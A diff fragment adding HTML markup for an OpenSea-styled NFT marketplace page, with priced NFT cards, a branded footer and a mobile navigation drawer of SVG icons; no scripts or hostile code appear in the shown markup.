+                            <div class="nft-collection">HARMONYBOT <span class="verified-badge"
+                                    style="width:13px;height:13px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                        style="width:8px;height:8px;">
+                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                    </svg></span></div>
+                            <div class="nft-name">Warplet #1187</div>
+                            <div class="nft-footer">
+                                <div>
+                                    <div class="nft-price-label">Price</div>
+                                    <div class="nft-price-val"><span class="eth-icon">Ξ</span> 0.12</div>
+                                </div>
+                                <div class="nft-last-sale">Last: 0.09</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="nft-card">
+                        <div class="nft-img" style="background:linear-gradient(135deg,#4a044e,#7e22ce);">
+                            <span style="font-size:54px;"><img src="img/smiley.png" alt="smileynft"></span>
+                            <div class="nft-hover-overlay"><button class="buy-now-btn">Buy Now</button></div>
+                        </div>
+                        <div class="nft-info">
+                            <div class="nft-collection">Grand Arena Cards <span class="verified-badge"
+                                    style="width:13px;height:13px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                        style="width:8px;height:8px;">
+                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                    </svg></span></div>
+                            <div class="nft-name">Smiley #0004</div>
+                            <div class="nft-footer">
+                                <div>
+                                    <div class="nft-price-label">Price</div>
+                                    <div class="nft-price-val"><span class="eth-icon">Ξ</span> 1.4</div>
+                                </div>
+                                <div class="nft-last-sale">Last: 1.25</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="nft-card">
+                        <div class="nft-img" style="background:linear-gradient(135deg,#14532d,#166534);">
+                            <span style="font-size:54px;"><img src="img/ranocchia.png" alt=""></span>
+                            <div class="nft-hover-overlay"><button class="buy-now-btn">Buy Now</button></div>
+                        </div>
+                        <div class="nft-info">
+                            <div class="nft-collection">Ranocchia <span class="verified-badge"
+                                    style="width:13px;height:13px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                        style="width:8px;height:8px;">
+                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                    </svg></span></div>
+                            <div class="nft-name">Ranocchia #3301</div>
+                            <div class="nft-footer">
+                                <div>
+                                    <div class="nft-price-label">Price</div>
+                                    <div class="nft-price-val"><span class="eth-icon">Ξ</span> 0.22</div>
+                                </div>
+                                <div class="nft-last-sale">Last: 0.19</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="nft-card">
+                        <div class="nft-img" style="background:linear-gradient(135deg,#7c2d12,#c2410c);">
+                            <span style="font-size:54px;"><img src="img/mirrorstagesnft.png" alt=""></span>
+                            <div class="nft-hover-overlay"><button class="buy-now-btn">Buy Now</button></div>
+                        </div>
+                        <div class="nft-info">
+                            <div class="nft-collection">BOTTO<span class="verified-badge"
+                                    style="width:13px;height:13px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                        style="width:8px;height:8px;">
+                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                    </svg></span></div>
+                            <div class="nft-name">Mirror Stages: Seed #0719</div>
+                            <div class="nft-footer">
+                                <div>
+                                    <div class="nft-price-label">Price</div>
+                                    <div class="nft-price-val"><span class="eth-icon">Ξ</span> 0.06</div>
+                                </div>
+                                <div class="nft-last-sale">Last: 0.055</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="nft-card">
+                        <div class="nft-img" style="background:linear-gradient(135deg,#1e3a5f,#2563eb);">
+                            <span style="font-size:54px;"><img src="img/ccomon.png" alt=""></span>
+                            <div class="nft-hover-overlay"><button class="buy-now-btn">Buy Now</button></div>
+                        </div>
+                        <div class="nft-info">
+                            <div class="nft-collection">SATOSHISMOM <span class="verified-badge"
+                                    style="width:13px;height:13px;"><svg viewBox="0 0 24 24" fill="currentColor"
+                                        style="width:8px;height:8px;">
+                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                    </svg></span></div>
+                            <div class="nft-name">Snailsickle #200</div>
+                            <div class="nft-footer">
+                                <div>
+                                    <div class="nft-price-label">Price</div>
+                                    <div class="nft-price-val"><span class="eth-icon">Ξ</span> 0.31</div>
+                                </div>
+                                <div class="nft-last-sale">Last: 0.28</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <footer id="footer">
+                <div class="footer-logo">
+                    <img src="img/OpenSeaLogo.png" alt="OpenSea logo"
+                        style="width:24px;height:24px;object-fit:contain;border-radius: 50%;" />
+                    OpenSea
+                </div>
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Terms of Service</a>
+                    <a href="#" class="footer-link">Privacy Policy</a>
+                    <a href="#" class="footer-link">Community</a>
+                    <a href="#" class="footer-link">Twitter / X</a>
+                    <a href="#" class="footer-link">Discord</a>
+                </div>
+                <div class="footer-copy">© 2025 OpenSea. All rights reserved.</div>
+            </footer>
+
+        </main>
+    </div>
+
+    <!-- ░░ MOBILE OVERLAY ░░ -->
+    <div id="mobile-overlay" onclick="closeDrawer()"></div>
+
+    <!-- ░░ MOBILE DRAWER ░░ -->
+    <div id="mobile-drawer">
+        <div class="drawer-header">
+            <div class="drawer-logo">
+                <img src="" alt="OpenSea logo" style="width:32px;height:32px;object-fit:contain;" />
+                OpenSea
+            </div>
+            <button class="drawer-close" onclick="closeDrawer()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <line x1="18" y1="6" x2="6" y2="18" />
+                    <line x1="6" y1="6" x2="18" y2="18" />
+                </svg>
+            </button>
+        </div>
+        <nav class="drawer-nav">
+            <div class="drawer-item active">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76" />
+                </svg>
+                Discover
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <rect x="3" y="3" width="7" height="7" rx="1" />
+                    <rect x="14" y="3" width="7" height="7" rx="1" />
+                    <rect x="3" y="14" width="7" height="7" rx="1" />
+                    <rect x="14" y="14" width="7" height="7" rx="1" />
+                </svg>
+                Collections
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <circle cx="12" cy="12" r="8" />
+                    <circle cx="12" cy="12" r="3" />
+                </svg>
+                Tokens
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <path d="M7 16V4m0 0L3 8m4-4 4 4" />
+                    <path d="M17 8v12m0 0 4-4m-4 4-4-4" />
+                </svg>
+                Swap
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <rect x="3" y="4" width="18" height="18" rx="2" />
+                    <line x1="16" y1="2" x2="16" y2="6" />
+                    <line x1="8" y1="2" x2="8" y2="6" />
+                    <line x1="3" y1="10" x2="21" y2="10" />
+                </svg>
+                Drops
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <line x1="8" y1="6" x2="21" y2="6" />
+                    <line x1="8" y1="12" x2="21" y2="12" />
+                    <line x1="8" y1="18" x2="21" y2="18" />
+                    <line x1="3" y1="6" x2="3.01" y2="6" />
+                    <line x1="3" y1="12" x2="3.01" y2="12" />
+                    <line x1="3" y1="18" x2="3.01" y2="18" />
+                </svg>
+                Activity
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <path
+                        d="M12 2L15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2Z" />
+                </svg>
+                Rewards
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <path d="m9.06 11.9 8.07-8.06a2.85 2.85 0 1 1 4.03 4.03l-8.06 8.08" />
+                    <path
+                        d="M7.07 14.94c-1.66 0-3 1.35-3 3.02 0 1.33-2.5 1.52-2 2.02 1.08 1.1 2.49 2.02 4 2.02 2.2 0 4-1.8 4-4.04a3.01 3.01 0 0 0-3-3.02z" />
+                </svg>
+                Studio
+            </div>
+
+            <div class="drawer-divider"></div>
+
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                    <circle cx="12" cy="7" r="4" />
+                </svg>
+                Profile
+            </div>
+
+            <div class="drawer-divider"></div>
+
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
+                    <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
+                </svg>
+                Resources
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <circle cx="12" cy="12" r="3" />
+                    <path
+                        d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
+                </svg>
+                Settings
+            </div>
+            <div class="drawer-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+                    <line x1="12" y1="17" x2="12.01" y2="17" />
+                </svg>
+                Support
+            </div>
+        </nav>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
